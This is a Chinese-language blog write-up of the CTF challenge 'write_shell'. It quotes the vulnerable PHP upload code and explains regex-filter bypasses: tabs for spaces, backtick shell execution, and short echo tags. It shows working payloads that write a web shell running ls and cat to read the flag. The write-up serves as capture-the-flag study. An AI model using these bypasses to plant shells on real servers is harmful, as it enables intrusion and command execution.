---
title: '[红明谷CTF 2021]write_shell 1'
categories:
  - 
tags: []
abbrlink: 36a1b5a2
date: 2026-02-02 16:01:58
---
# [红明谷CTF 2021]write_shell

# 1



看到一个url

![image-20260202144847654](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202144847654.png)

得到地址：

sandbox/331f5a2fec4659f9c8cd3a470a780b69/

---



源代码

```
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
    	//正则需要绕过
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);	
        //上传内容
}
?>
```

注意点：

**1.file_get_contents()和file_put_contents()**

前者为读取，后者为写入

```
file_put_contents("$dir" . "index.php", $data);	

file_put_contents($filename, $data);
$filename（第一个参数）：存入文件的路径和名字->sandbox/331f5a2fec4659f9c8cd3a470a780b69/index.php
$data（第二个参数）：存入内容->$data
```





**2. 正则绕过**

2.1 空格->\t制表符

2.2 绕过eval

->``【反引号为**执行运算符（Execution Operator）**】

PHP 中把一段文字放在反引号里时，

PHP 会尝试将这段文字当作**操作系统的命令行（Shell）**来执行，并返回执行后的结果。

2.3 绕过php和;

-><?=  ?>



![image-20260202154519524](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202154519524.png)



---

## 步骤：写入文件+打开文件

构造payload：

```
?action=upload&data=<?=`ls\t/`?>
```

查看文件：

```
sandbox/331f5a2fec4659f9c8cd3a470a780b69/index.php

bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
```

然后你能在这个url下看到一个文件 flllllll1112222222lag





继续改变命令

```
?action=upload&data=<?=`cat\tflllllll1112222222lag`?>
```



![image-20260202155947819](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260202155947819.png)
